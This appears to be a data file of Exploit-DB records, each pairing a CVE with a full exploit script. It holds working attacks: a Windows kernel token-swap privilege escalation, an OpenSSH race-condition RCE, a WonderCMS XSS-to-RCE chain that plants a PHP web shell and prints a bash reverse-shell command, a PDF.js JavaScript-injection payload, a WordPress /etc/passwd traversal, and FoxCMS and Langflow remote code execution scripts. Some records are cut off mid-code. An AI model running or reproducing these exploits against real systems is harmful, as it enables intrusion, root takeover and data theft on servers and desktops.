(fNtWriteVirtualMemory)GetProcAddress(GetModuleHandle(L""ntdll""), ""NtWriteVirtualMemory""); if (!NtReadVirtualMemory || !NtWriteVirtualMemory) { printf(""Failed to get addresses for NtReadVirtualMemory or NtWriteVirtualMemory\n""); return -1; printf(""NtReadVirtualMemory = 0x%p\n"", (DWORD64)NtReadVirtualMemory); printf(""NtWriteVirtualMemory = 0x%p\n"", (DWORD64)NtWriteVirtualMemory); HANDLE threadHandle = OpenThread(THREAD_ALL_ACCESS, FALSE, threadId); if (threadHandle == NULL) { printf(""Failed to get real handle to the current thread. Error: %lu\n"", GetLastError()); return 1; address_to_write = (LPVOID)((DWORD64)(GetKAddrFromHandle(threadHandle)) + 0x232); auto pcclfscontainer = VirtualAlloc((LPVOID)0x2100000, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE); memset(pcclfscontainer, 0, 0x1000); auto vtable = (DWORD64)pcclfscontainer + 0x100; auto rcx = pcclfscontainer; *(PDWORD64)((PCHAR)rcx + 0x40) = (DWORD64)pcclfscontainer + 0x200; *(PDWORD64)((PCHAR)pcclfscontainer + 0x200 + 0x68) = (DWORD64)g_ntbase + DBGKPTRIAGEDUMPRESTORESTATE_OFFSET; *(PDWORD64)((PCHAR)rcx + 0x48) = (DWORD64)pcclfscontainer + 0x300; auto arg_DBGKPTRIAGEDUMPRESTORESTATE = (DWORD64)pcclfscontainer + 0x300; It writes at offset 0x2078 of where *((PDWORD64)(arg_DBGKPTRIAGEDUMPRESTORESTATE)) = (DWORD64)address_to_write - 0x2078; *((PDWORD64)((PCHAR)arg_DBGKPTRIAGEDUMPRESTORESTATE + 0x10)) = 0x0014000000000f00; ((PDWORD64)vtable)[1] = (DWORD64)g_ntbase + POFXPROCESSORNOTIFICATION_OFFSET; *(PDWORD64)pcclfscontainer = (DWORD64)vtable; printf(""pcclfscontainer = 0x%p\n"", (DWORD64)pcclfscontainer); printf(""address_to_write = 0x%p\n"", (DWORD64)address_to_write); HANDLE processHandle = GetCurrentProcess(); // Get the current process handle if (SetPriorityClass(processHandle, REALTIME_PRIORITY_CLASS)) { printf(""Process priority set to REALTIME_PRIORITY_CLASS.\n""); else { DWORD error = GetLastError(); printf(""Failed to set process priority. Error code: %lu\n"", error); return 1; threadHandle = GetCurrentThread(); if (SetThreadPriority(threadHandle, THREAD_PRIORITY_TIME_CRITICAL)) { printf(""Thread priority set to the highest level: TIME_CRITICAL.\n""); else { DWORD error = GetLastError(); printf(""Failed to set thread priority. Error code: %lu\n"", error); return 1; printf(""triggering vuln...""); logHndl = CreateLogFile(logFileName.c_str(), GENERIC_WRITE | GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, 0); if (logHndl == INVALID_HANDLE_VALUE) { printf(""CreateLogFile failed with error %d\n"", GetLastError()); else { printf(""file opened successfully\n""); if (SetPriorityClass(processHandle, NORMAL_PRIORITY_CLASS)) { printf(""Process priority set to NORMAL_PRIORITY_CLASS.\n""); else { DWORD error = GetLastError(); printf(""Failed to set process priority. Error code: %lu\n"", error); return 1; if (SetThreadPriority(threadHandle, THREAD_PRIORITY_NORMAL)) { printf(""Thread priority set to the highest level: THREAD_PRIORITY_NORMAL.\n""); else { DWORD error = GetLastError(); printf(""Failed to set thread priority. Error code: %lu\n"", error); return 1; printf(""vuln triggered\n""); printf(""reading base of ntoskrnl to check we have arbitrary read/write\n""); NtReadVirtualMemory((HANDLE)-1, g_ntbase, &buf, sizeof(buf), NULL); printf(""buf = 0x%p\n"", (DWORD64)buf); printf(""swapping tokens...\n""); NtReadVirtualMemory((HANDLE)-1, (LPVOID)((DWORD64)g_ntbase + PSACTIVEPROCESSHEAD_OFFSET), &eprocess, sizeof(eprocess), NULL); eprocess = eprocess - ACTIVEPROCESSLINKS_OFFSET; NtReadVirtualMemory((HANDLE)-1, (LPVOID)(eprocess + TOKEN_OFFSET), &systemtoken, sizeof(systemtoken), NULL); while (1) { NtReadVirtualMemory((HANDLE)-1, (LPVOID)(eprocess + ACTIVEPROCESSLINKS_OFFSET), &eprocess, sizeof(eprocess), NULL); eprocess -= ACTIVEPROCESSLINKS_OFFSET; NtReadVirtualMemory((HANDLE)-1, (LPVOID)(eprocess + UNIQUEPROCESSID_OFFSET), &pid, sizeof(pid), NULL); if (pid == (DWORD64)GetCurrentProcessId()) break; printf(""current token address = 0x%p\n"", eprocess + TOKEN_OFFSET); printf(""systemtoken = 0x%p\n"", systemtoken); printf(""Overwriting process token..\n""); NtWriteVirtualMemory((HANDLE)-1, (LPVOID)(eprocess + TOKEN_OFFSET), &systemtoken, sizeof(systemtoken), NULL); printf(""token swapped. Restoring PreviousMode and spawning system shell...\n""); PreviousModeAddr = address_to_write; PreviousMode = 0x1; NtWriteVirtualMemory((HANDLE)-1, PreviousModeAddr, &PreviousMode, sizeof(PreviousMode), NULL); system(""cmd.exe""); return 0;"
CVE-2024-21338,2025-04-22,exploit db,"# Exploit Title: Microsoft Windows 11 - Kernel Privilege Escalation # Date: 2025-04-16 # Exploit Author: Milad Karimi (Ex3ptionaL) # Contact: miladgrayhat@gmail.com # Zone-H: www.zone-h.org/archive/notifier=Ex3ptionaL # Tested on: Win, Ubuntu # CVE : CVE-2024-21338 #include ""pch.hpp"" #include """
CVE-2024-6387,2025-04-22,exploit db,"* Exploit Title : OpenSSH server (sshd) 9.8p1 - Race Condition * Author : Milad Karimi (Ex3ptionaL) * Date : 2025-04-16 * Description: * Targets a signal handler race condition in OpenSSH's * server (sshd) on glibc-based Linux systems. It exploits a vulnerability * where the SIGALRM handler calls async-signal-unsafe functions, leading * to rce as root. * Notes: * 1. Shellcode : Replace placeholder with actual payload. * 2. GLIBC_BASES : Needs adjustment for specific target systems. * 3. Timing parameters: Fine-tune based on target system responsiveness. * 4. Heap layout : Requires tweaking for different OpenSSH versions. * 5. File structure offsets: Verify for the specific glibc version. #include #include #include #include #include #include #include #include #include #include #include #include #define MAX_PACKET_SIZE (256 * 1024) #define LOGIN_GRACE_TIME 120 #define MAX_STARTUPS 100 #define CHUNK_ALIGN(s) (((s) + 15) & ~15) uint64_t GLIBC_BASES[] = { 0xb7200000, 0xb7400000 }; int NUM_GLIBC_BASES = sizeof (GLIBC_BASES) / sizeof (GLIBC_BASES[0]); unsigned char shellcode[] = ""\x90\x90\x90\x90""; int setup_connection (const char *ip, int port); void send_packet (int sock, unsigned char packet_type, const unsigned char *data, size_t len); void prepare_heap (int sock); void time_final_packet (int sock, double *parsing_time); int attempt_race_condition (int sock, double parsing_time, uint64_t glibc_base); double measure_response_time (int sock, int error_type); void create_public_key_packet (unsigned char *packet, size_t size, uint64_t glibc_base); void create_fake_file_structure (unsigned char *data, size_t size, uint64_t glibc_base); void send_ssh_version (int sock); int receive_ssh_version (int sock); void send_kex_init (int sock); int receive_kex_init (int sock); int perform_ssh_handshake (int sock); int main (int argc, char *argv[]) if (argc != 3) fprintf (stderr, ""Usage: %s \n"", argv[0]); exit (1); const char *ip = argv[1]; int port = atoi (argv[2]); double parsing_time = 0; int success = 0; srand (time (NULL)); for (int base_idx = 0; base_idx < NUM_GLIBC_BASES && !success; base_idx++) uint64_t glibc_base = GLIBC_BASES[base_idx]; printf (""Attempting exploitation with glibc base: 0x%lx\n"", glibc_base); for (int attempt = 0; attempt < 20000 && !success; attempt++) if (attempt % 1000 == 0) printf (""Attempt %d of 20000\n"", attempt); int sock = setup_connection (ip, port); if (sock < 0) fprintf (stderr, ""Failed to establish connection, attempt %d\n"", attempt); continue; if (perform_ssh_handshake (sock) < 0) fprintf (stderr, ""SSH handshake failed, attempt %d\n"", attempt); close (sock); continue; prepare_heap (sock); time_final_packet (sock, &parsing_time); if (attempt_race_condition (sock, parsing_time, glibc_base)) printf (""Possible exploitation success on attempt %d with glibc "" ""base 0x%lx!\n"", attempt, glibc_base); success = 1; break; close (sock); usleep (100000); // 100ms delay between attempts, as mentioned in the return !success; int setup_connection (const char *ip, int port) int sock = socket (AF_INET, SOCK_STREAM, 0); if (sock < 0) perror (""socket""); return -1; struct sockaddr_in server_addr; memset (&server_addr, 0, sizeof (server_addr)); server_addr.sin_family = AF_INET; server_addr.sin_port = htons (port); if (inet_pton (AF_INET, ip, &server_addr.sin_addr) <= 0) perror (""inet_pton""); close (sock); return -1; if (connect (sock, (struct sockaddr *)&server_addr, sizeof (server_addr)) < 0) perror (""connect""); close (sock); return -1; int flags = fcntl (sock, F_GETFL, 0); fcntl (sock, F_SETFL, flags | O_NONBLOCK); return sock; void send_packet (int sock, unsigned char packet_type, const unsigned char *data, size_t len) unsigned char packet[MAX_PACKET_SIZE]; size_t packet_len = len + 5; packet[0] = (packet_len >> 24) & 0xFF; packet[1] = (packet_len >> 16) & 0xFF; packet[2] = (packet_len >> 8) & 0xFF; packet[3] = packet_len & 0xFF; packet[4] = packet_type; memcpy (packet + 5, data, len); if (send (sock, packet, packet_len, 0) < 0) perror (""send_packet""); void send_ssh_version (int sock) const char *ssh_version = ""SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.1\r\n""; if (send (sock, ssh_version, strlen (ssh_version), 0) < 0) perror (""send ssh version""); int receive_ssh_version (int sock) char buffer[256]; ssize_t received; do received = recv (sock, buffer, sizeof (buffer) - 1, 0); while (received < 0 && (errno == EWOULDBLOCK || errno == EAGAIN)); if (received > 0) buffer[received] = '\0'; printf (""Received SSH version: %s"", buffer); return 0; else if (received == 0) fprintf (stderr, ""Connection closed while receiving SSH version\n""); else perror (""receive ssh version""); return -1; void send_kex_init (int sock) unsigned char kexinit_payload[36] = { 0 }; send_packet (sock, 20, kexinit_payload, sizeof (kexinit_payload)); int receive_kex_init (int sock) unsigned char buffer[1024]; ssize_t received; do received = recv (sock, buffer, sizeof (buffer), 0); while (received < 0 && (errno == EWOULDBLOCK || errno == EAGAIN)); if (received > 0) printf (""Received KEX_INIT (%zd bytes)\n"", received); return 0; else if (received == 0) fprintf (stderr, ""Connection closed while receiving KEX_INIT\n""); else perror (""receive kex init""); return -1; int perform_ssh_handshake (int sock) send_ssh_version (sock); if (receive_ssh_version (sock) < 0) return -1; send_kex_init (sock); if (receive_kex_init (sock) < 0) return -1; return 0; void prepare_heap (int sock) for (int i = 0; i < 10; i++) unsigned char tcache_chunk[64]; memset (tcache_chunk, 'A', sizeof (tcache_chunk)); send_packet (sock, 5, tcache_chunk, sizeof (tcache_chunk)); for (int i = 0; i < 27; i++) unsigned char large_hole[8192]; memset (large_hole, 'B', sizeof (large_hole)); send_packet (sock, 5, large_hole, sizeof (large_hole)); unsigned char small_hole[320]; memset (small_hole, 'C', sizeof (small_hole)); send_packet (sock, 5, small_hole, sizeof (small_hole)); for (int i = 0; i < 27; i++) unsigned char fake_data[4096]; create_fake_file_structure (fake_data, sizeof (fake_data), GLIBC_BASES[0]); send_packet (sock, 5, fake_data, sizeof (fake_data)); unsigned char large_string[MAX_PACKET_SIZE - 1]; memset (large_string, 'E', sizeof (large_string)); send_packet (sock, 5, large_string, sizeof (large_string)); void create_fake_file_structure (unsigned char *data, size_t size, uint64_t glibc_base) memset (data, 0, size); struct void *_IO_read_ptr; void *_IO_read_end; void *_IO_read_base; void *_IO_write_base; void *_IO_write_ptr; void *_IO_write_end; void *_IO_buf_base; void *_IO_buf_end; void *_IO_save_base; void *_IO_backup_base; void *_IO_save_end; void *_markers; void *_chain; int _fileno; int _flags; int _mode; char _unused2[40]; void *_vtable_offset; } *fake_file = (void *)data; fake_file->_vtable_offset = (void *)0x61; *(uint64_t *)(data + size - 16) = glibc_base + 0x21b740; // fake vtable (_IO_wfile_jumps) *(uint64_t *)(data + size - 8) = glibc_base + 0x21d7f8; // fake _codecvt void time_final_packet (int sock, double *parsing_time) double time_before = measure_response_time (sock, 1); double time_after = measure_response_time (sock, 2); *parsing_time = time_after - time_before; printf (""Estimated parsing time: %.6f seconds\n"", *parsing_time); double measure_response_time (int sock, int error_type) unsigned char error_packet[1024]; size_t packet_size; if (error_type == 1) packet_size = snprintf ((char *)error_packet, sizeof (error_packet), ""ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC3""); else packet_size = snprintf ((char *)error_packet, sizeof (error_packet), ""ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAAQQDZy9""); struct timespec start, end; clock_gettime (CLOCK_MONOTONIC, &start); send_packet (sock, 50, error_packet, packet_size); // SSH_MSG_USERAUTH_REQUEST char response[1024]; ssize_t received; do received = recv (sock, response, sizeof (response), 0); while (received < 0 && (errno == EWOULDBLOCK || errno == EAGAIN)); clock_gettime (CLOCK_MONOTONIC, &end); double elapsed = (end.tv_sec - start.tv_sec) + (end.tv_nsec - start.tv_nsec) / 1e9; return elapsed; void create_public_key_packet (unsigned char *packet, size_t size, uint64_t glibc_base) memset (packet, 0, size); size_t offset = 0; for (int i = 0; i < 27; i++) *(uint32_t *)(packet + offset) = CHUNK_ALIGN (4096); offset += CHUNK_ALIGN (4096); *(uint32_t *)(packet + offset) = CHUNK_ALIGN (304); offset += CHUNK_ALIGN (304); memcpy (packet, ""ssh-rsa "", 8); memcpy (packet + CHUNK_ALIGN (4096) * 13 + CHUNK_ALIGN (304) * 13, shellcode, sizeof (shellcode)); for (int i = 0; i < 27; i++) create_fake_file_structure (packet + CHUNK_ALIGN (4096) * (i + 1) + CHUNK_ALIGN (304) * i, CHUNK_ALIGN (304), glibc_base); int attempt_race_condition (int sock, double parsing_time, uint64_t glibc_base) unsigned char final_packet[MAX_PACKET_SIZE]; create_public_key_packet (final_packet, sizeof (final_packet), glibc_base); if (send (sock, final_packet, sizeof (final_packet) - 1, 0) < 0) perror (""send final packet""); return 0; struct timespec start, current; clock_gettime (CLOCK_MONOTONIC, &start); while (1) clock_gettime (CLOCK_MONOTONIC, &current); double elapsed = (current.tv_sec - start.tv_sec) + (current.tv_nsec - start.tv_nsec) / 1e9; if (elapsed >= (LOGIN_GRACE_TIME - parsing_time - 0.001)) { // 1ms before SIGALRM if (send (sock, &final_packet[sizeof (final_packet) - 1], 1, 0) < 0) perror (""send last byte""); return 0; break; char response[1024]; ssize_t received = recv (sock, response, sizeof (response), 0); if (received > 0) printf (""Received response after exploit attempt (%zd bytes)\n"", received); if (memcmp (response, ""SSH-2.0-"", 8) != 0) printf (""Possible hit on 'large' race window\n""); return 1; else if (received == 0) printf ( ""Connection closed by server - possible successful exploitation\n""); return 1; else if (errno == EWOULDBLOCK || errno == EAGAIN) printf (""No immediate response from server - possible successful "" ""exploitation\n""); return 1; else perror (""recv""); return 0; int perform_exploit (const char *ip, int port) int success = 0; double parsing_time = 0; double timing_adjustment = 0; for (int base_idx = 0; base_idx < NUM_GLIBC_BASES && !success; base_idx++) uint64_t glibc_base = GLIBC_BASES[base_idx]; printf (""Attempting exploitation with glibc base: 0x%lx\n"", glibc_base); for (int attempt = 0; attempt < 10000 && !success; attempt++) if (attempt % 1000 == 0) printf (""Attempt %d of 10000\n"", attempt); int sock = setup_connection (ip, port); if (sock < 0) fprintf (stderr, ""Failed to establish connection, attempt %d\n"", attempt); continue; if (perform_ssh_handshake (sock) < 0) fprintf (stderr, ""SSH handshake failed, attempt %d\n"", attempt); close (sock); continue; prepare_heap (sock); time_final_packet (sock, &parsing_time); parsing_time += timing_adjustment; if (attempt_race_condition (sock, parsing_time, glibc_base)) printf (""Possible exploitation success on attempt %d with glibc "" ""base 0x%lx!\n"", attempt, glibc_base); success = 1; the else timing_adjustment += 0.00001; // Small incremental adjustment close (sock); usleep (100000); // 100ms delay between attempts, as mentioned in the return success;"
CVE-2023-41425,2025-04-22,exploit db,"# Exploit Title: WonderCMS 3.4.2 - Remote Code Execution (RCE) # Date: 2025-04-16 # Exploit Author: Milad Karimi (Ex3ptionaL) # Contact: miladgrayhat@gmail.com # Zone-H: www.zone-h.org/archive/notifier=Ex3ptionaL # MiRROR-H: https://mirror-h.org/search/hacker/49626/ # CVE: CVE-2023-41425 import requests import argparse from argparse import RawTextHelpFormatter import os import subprocess import zipfile from termcolor import colored def main(): parser = argparse.ArgumentParser(description=""Exploit Wonder CMS v3.4.2 XSS to RCE"", formatter_class=RawTextHelpFormatter) parser.add_argument(""--url"", required=True, help=""Target URL of loginURL (Example: http://sea.htb/loginURL)"") parser.add_argument(""--xip"", required=True, help=""IP for HTTP web server that hosts the malicious .js file"") parser.add_argument(""--xport"", required=True, help=""Port for HTTP web server that hosts the malicious .js file"") args = parser.parse_args() target_login_url = args.url target_split = args.url.split('/') target_url = target_split[0] + '//' + target_split[2] # Web Shell print(""[+] Creating PHP Web Shell"") if not os.path.exists('malicious'): os.mkdir('malicious') with open ('malicious/malicious.php', 'w') as f: f.write(' ') with zipfile.ZipFile('./malicious.zip', 'w') as z: z.write('malicious/malicious.php') os.remove('malicious/malicious.php') os.rmdir('malicious') else: print(colored(""[!] Directory malicious already exists!"", 'yellow')) # Malicious .js js = f'''var token = document.querySelectorAll('[name=""token""]')[0].value; var module_url = ""{target_url}/?installModule=http://{args.xip}:{args.xport}/malicious.zip&directoryName=pwned&type=themes&token="" + token; var xhr = new XMLHttpRequest(); xhr.withCredentials = true; xhr.open(""GET"", module_url); xhr.send();''' print(""[+] Writing malicious.js"") with open('malicious.js', 'w') as f: f.write(js) xss_payload = args.url.replace(""loginURL"", ""index.php?page=loginURL?"")+""\""> "", 'red')) print(""[+] To get a reverse shell connection run the following:"") print(colored(f""curl -s '{target_url}/themes/malicious/malicious.php' --get --data-urlencode \""cmd=bash -c 'bash -i >& /dev/tcp/ / 0>&1'\"" "", 'yellow')) print(""[+] Starting HTTP server"") subprocess.run([""python3"", ""-m"", ""http.server"", ""-b"", args.xip, args.xport]) if __name__ == ""__main__"": main()"
CVE-2025-28121,2025-04-22,exploit db,"# Exploit Title: code-projects Online Exam Mastering System 1.0 - Reflected Cross-Site Scripting (XSS) # Google Dork: inurl:/exam/feedback.php # Date: 2025-04-19 # Exploit Author: Pruthu Raut # Vendor Homepage: https://code-projects.org/ # Software Link: https://code-projects.org/online-exam-system-in-php-with-source-code/ # Version: 1.0 # Tested on: XAMPP on Windows 10 / Kali Linux (Apache + PHP 7.x) # CVE : CVE-2025-28121 # Description: # code-projects Online Exam Mastering System 1.0 is vulnerable to a Reflected XSS vulnerability in feedback.php via the ""q"" parameter. # The application fails to sanitize user input properly, allowing attackers to inject arbitrary JavaScript code. # Vulnerable URL: # http://localhost/exam/feedback.php?q=Thank%20you%20for%20your%20valuable%20feedback"
CVE-2024-4367,2025-04-22,exploit db,"# Exploit Title: Firefox ESR 115.11 - Arbitrary JavaScript execution in PDF.js # Date: 2025-04-16 # Exploit Author: Milad Karimi (Ex3ptionaL) # Contact: miladgrayhat@gmail.com # Zone-H: www.zone-h.org/archive/notifier=Ex3ptionaL # MiRROR-H: https://mirror-h.org/search/hacker/49626/ # Vendor Homepage: https://wordpress.org # Version: = 115.11 # Tested on: Win, Ubuntu # CVE : CVE-2024-4367 #!/usr/bin/env python3 import sys def generate_payload(payload): backslash_char = ""\\"" fmt_payload = payload.replace('(', '\\(').replace(')', '\\)') font_matrix = f""/FontMatrix [0.1 0 0 0.1 0 (1{backslash_char});\n"" + f""{fmt_payload}"" + ""\n//)]"" return f"""""" %PDF-1.4 %DUMMY 8 0 obj /PatternType 2 /Shading<< /Function<< /Domain[0 1] /C0[0 0 1] /C1[1 0.6 0] /N 1 /FunctionType 2 /ShadingType 2 /Coords[46 400 537 400] /Extend[false false] /ColorSpace/DeviceRGB /Type/Pattern endobj 5 0 obj /Widths[573 0 582 0 548 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 573 0 573 0 341] /Type/Font /BaseFont/PAXEKO+SourceSansPro-Bold /LastChar 102 /Encoding/WinAnsiEncoding {font_matrix} /Subtype/Type1 /FirstChar 65 /FontDescriptor 9 0 R endobj 2 0 obj /Kids[3 0 R] /Type/Pages /Count 1 endobj 9 0 obj /Type/FontDescriptor /ItalicAngle 0 /Ascent 751 /FontBBox[-6 -12 579 713] /FontName/PAXEKO+SourceSansPro-Bold /StemV 100 /CapHeight 713 /Flags 32 /FontFile3 10 0 R /Descent -173 /MissingWidth 250 endobj 6 0 obj /Length 128 stream 47 379 489 230 re S /Pattern cs BT 50 500 Td 117 TL /F1 150 Tf /P1 scn (AbCdEf) Tj /P2 scn (AbCdEf) ' ET endstream endobj 3 0 obj /Type/Page /Resources 4 0 R /Contents 6 0 R /Parent 2 0 R /MediaBox[0 0 595.2756 841.8898] endobj 10 0 obj /Length 800 /Subtype/Type2 stream endstream endobj 7 0 obj /PatternType 1 /Matrix[1 0 0 1 50 0] /Length 58 /TilingType 1 /BBox[0 0 16 16] /YStep 16 /PaintType 1 /Resources<< /XStep 16 stream 0.65 g 0 0 16 16 re f 0.15 g 0 0 8 8 re f 8 8 8 8 re f endstream endobj 4 0 obj /Pattern<< /P1 7 0 R /P2 8 0 R /Font<< /F1 5 0 R endobj 1 0 obj /Pages 2 0 R /Type/Catalog /OpenAction[3 0 R /Fit] endobj xref 0 11 0000000000 65535 f 0000002260 00000 n 0000000522 00000 n 0000000973 00000 n 0000002178 00000 n 0000000266 00000 n 0000000794 00000 n 0000001953 00000 n 0000000015 00000 n 0000000577 00000 n 0000001085 00000 n trailer /ID[(DUMMY) (DUMMY)] /Root 1 0 R /Size 11 startxref 2333 %%EOF if __name__ == ""__main__"": if len(sys.argv) != 2: print(f""Usage: {sys.argv[0]} "") sys.exit(1) print(""[+] Created malicious PDF file:"
CVE-2023-2745,2025-04-22,exploit db,"# Exploit Title: WordPress Core 6.2 - Directory Traversal # Date: 2025-04-16 # Exploit Author: Milad Karimi (Ex3ptionaL) # Contact: miladgrayhat@gmail.com # Zone-H: www.zone-h.org/archive/notifier=Ex3ptionaL # Version: = 6.2 # Tested on: Win, Ubuntu # CVE : CVE-2023-2745 import requests from colorama import init, Fore, Style init(autoreset=True) url = input(""E.G https://example.com/wp-login.php : "") payload = '../../../../../etc/passwd' response = requests.get(url, params={'wp_lang': payload}) if response.status_code == 200: if ""root:x:0:0:root"" in response.text: print(Fore.GREEN + 'Exploit successful, accessed content:') print(Fore.GREEN + response.text) else: print(Fore.YELLOW + 'Accessed content, but the expected file was not found:') print(Fore.YELLOW + response.text) elif response.status_code in {400, 401, 403, 404}: print(Fore.RED + f'Client error, status code: {response.status_code}') elif response.status_code // 100 == 5: print(Fore.RED + f'Server error, status code: {response.status_code}') elif response.status_code // 100 == 3: print(Fore.YELLOW + f'Redirection, status code: {response.status_code}') else: print(f'Status code: {response.status_code}')"
CVE-2024-45440,2025-04-19,exploit db,"#!/usr/bin/env python # Exploit Title: Drupal 11.x-dev - Full Path Disclosure # Date: 2025-04-16 # Exploit Author: Milad Karimi (Ex3ptionaL) # Contact: miladgrayhat@gmail.com # Zone-H: www.zone-h.org/archive/notifier=Ex3ptionaL # MiRROR-H: https://mirror-h.org/search/hacker/49626/ # Version: 11.x-dev # CVE: CVE-2024-45440 # -*- coding:UTF-8 -*- import re import requests def banners(): cve_id = ""CVE-2024-45440"" description = ""Drupal 11.x-dev Full Path Disclosure Vulnerability: "" \ ""core/authorize.php allows Full Path Disclosure (even when error logging is None) "" \ ""if the value of hash_salt is file_get_contents of a file that does not exist."" disclaimer = ""This tool is for educational purposes only. Any misuse of this information is the responsibility of "" \ ""the person utilizing this tool. The author assumes no responsibility or liability for any misuse or "" \ ""damage caused by this program."" width = 100 banner_top_bottom = ""="" * width banner_middle = f""{cve_id:^{width}}\n\n{description:^{width}}"" banner = f""{banner_top_bottom}\n\n{banner_middle}\n\n{disclaimer}\n\n{banner_top_bottom}"" return banner def scan_single_url(url=None): if url is None: print(""[+] Input the IP/Domain Example: 127.0.0.1 or 127.0.0.1:8080"") url = input(""[+] IP/Domain: "") if not url.startswith('https://') and not url.startswith('http://'): full_url = 'http://' + url + '/core/authorize.php' print(""[*] Scanning..."") try: headers = { ""Host"": url, ""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2"" response = requests.get(full_url, headers,timeout=10) pattern = r' (/.*?settings\.php)' matches = re.findall(pattern, response.text) # print(response.text) if 'settings.php' in response.text: print(f""[+] {url} Existed!"") for match in matches: print(""[+] The full path is:"", match) return True else: print(f""[-] {url} Not Exist!"") return False except TimeoutError: print(f""[-] {url} Timeout!"") except Exception as e: print(f""[-] {url} Failed!"") return False def scan_multiple_urls(): print(""[+] Input the path of txt Example: ./url.txt or C:\\the\\path\\to\\url.txt"") url_path = input(""[+] Path: "") url_list = [] result_list = [] try: with open(url_path, 'r', encoding='utf-8') as f: lines = f.readlines() for line in lines: url_list.append(line.strip()) except FileNotFoundError as e: print(""[-] File Not Found!"") for url in url_list: result = scan_single_url(url) if result: result_list.append(url) print(""[+] Successful Target:"") for result in result_list: print(f""[+] {result}"") def main(): print(banners()) print(""[1] Scan single url\n[2] Scan multiple urls"") choice = input(""[+] Choose: "") if choice == '1': scan_single_url() elif choice == '2': scan_multiple_urls() else: print(""[-] Invalid option selected!"") pass if __name__ == '__main__': main()"
CVE-2025-29306,2025-04-19,exploit db,"# Date: 2025-04-17 # Exploit Title: # Exploit Author: VeryLazyTech # Vendor Homepage: https://www.foxcms.org/ # Software Link: https://www.foxcms.cn/ # Version: FoxCMS v.1.2.5 # Tested on: Ubuntu 22.04, Windows Server 2019 # CVE: CVE-2025-29306 # Website: https://www.verylazytech.com #!/bin/bash banner() { cat <<'EOF' | |___ \ V / | |___ / __/| |_| / __/ ___) | / __/ \__, |__) | |_| | (_) | \ V / __/ | | |_| | | |__| (_| |/ /| |_| | | | __/ (__| | | | @VeryLazyTech - Medium EOF # Call the banner function banner set -e # Check for correct number of arguments if [ ""$#"" -ne 2 ]; then printf ""Usage: $0 "" exit 1 fi TARGET=$1 # Encode payload ENCODED_CMD=$(python3 -c ""import urllib.parse; print(urllib.parse.quote('\${@print_r(@system(\""$2\""))}'))"") FULL_URL=""${TARGET}?id=${ENCODED_CMD}"" echo ""[*] Sending RCE payload: $2"" HTML=$(curl -s ""$FULL_URL"") # Extract from known XPath location using xmllint UL_CONTENT=$(echo ""$HTML"" | xmllint --html --xpath ""/html/body/header/div[1]/div[2]/div[1]/ul"" - 2>/dev/null) # Strip tags, clean up CLEANED=$(echo ""$UL_CONTENT"" | sed 's/<[^>]*>//g' | sed '/^$/d' | sed 's/^[[:space:]]*//') echo echo ""[+] Command Output:"" echo ""$CLEANED"""
CVE-2025-3248,2025-04-18,exploit db,"# Exploit Title: Langflow 1.3.0 - Remote Code Execution (RCE) # Date: 2025-04-17 # Exploit Author: VeryLazyTech # Vendor Homepage: http://www.langflow.org/ # Software Link: https://github.com/langflow-ai/langflow # Version: Langflow < 1.3.0 # Tested on: Windows Server 2019 # CVE: CVE-2025-3248 # CVE-2025-3248 - Remote and unauthenticated attacker can send crafted HTTP requests to execute arbitrary code # FOFA ""Langflow"" # Medium: https://medium.com/@verylazytech # GitHub: https://github.com/verylazytech # Shop: https://shop.verylazytech.com # Website: https://www.verylazytech.com import argparse import requests import json from urllib.parse import urljoin import random from colorama import init, Fore, Style # Disable SSL warnings requests.packages.urllib3.disable_warnings() # Initialize colorama init(autoreset=True) # Constants ENDC = ""\033[0m"" ENCODING = ""UTF-8"" COLORS = [Fore.GREEN, Fore.CYAN, Fore.BLUE] def banner(): random_color = random.choice(COLORS) return f""""""{Style.BRIGHT}{random_color} | |___ \ V / | |___ / __/| |_| / __/ ___) | ___) / __/|__ _| (_) | \ V / __/ | | |_| | | |__| (_| |/ /| |_| | | | __/ (__| | | | {Style.BRIGHT}{Fore.WHITE}@VeryLazyTech - Medium {Style.RESET_ALL}\n {Style.RESET_ALL} print(banner()) class LangflowScanner: def __init__(self, url, timeout=10): self.url = url.rstrip('/') self.timeout = timeout self.session = requests.Session() self.session.verify = False self.session.headers.update({ 'User-Agent': 'Mozilla/5.0', 'Content-Type': 'application/json', 'Accept': 'application/json', def exploit(self, command): endpoint = urljoin(self.url, '/api/v1/validate/code') payload = { ""code"": f"""""" def run(cd=exec('raise Exception(__import__(""subprocess"").check_output(""{command}"", shell=True))')): pass try: print(f""{Fore.YELLOW}[*] Sending payload to {endpoint}"") response = self.session.post(endpoint, json=payload, timeout=self.timeout) print(f""{Fore.YELLOW}[*] Status Code: {response.status_code}"") print(f""{Fore.YELLOW}[*] Raw Response: {response.text}"") if response.status_code == 200: try: data = response.json() error_msg = data.get(""function"", {}).get(""errors"", [""""])[0] if isinstance(error_msg, str) and error_msg.startswith(""b'""): output = error_msg[2:-1].encode().decode('unicode_escape').strip() return output except Exception as e: return f""[!] Failed to parse response: {str(e)}"" return f""[!] Exploit failed with status {response.status_code}"" except requests.RequestException as e: return f""[!] Request failed: {str(e)}"" def main(): parser = argparse.ArgumentParser(description=""Langflow CVE-2025-3248 Exploit"") parser.add_argument(""url"", help=""Target base URL (e.g., http://host:port)"") parser.add_argument(""cmd"", help=""Command to execute (e.g., whoami)"") args = parser.parse_args() scanner = LangflowScanner(args.url) result = scanner.exploit(args.cmd) print(f""{Fore.GREEN}[+] Command Output:\n{result}"") if __name__ == ""__main__"": main()"
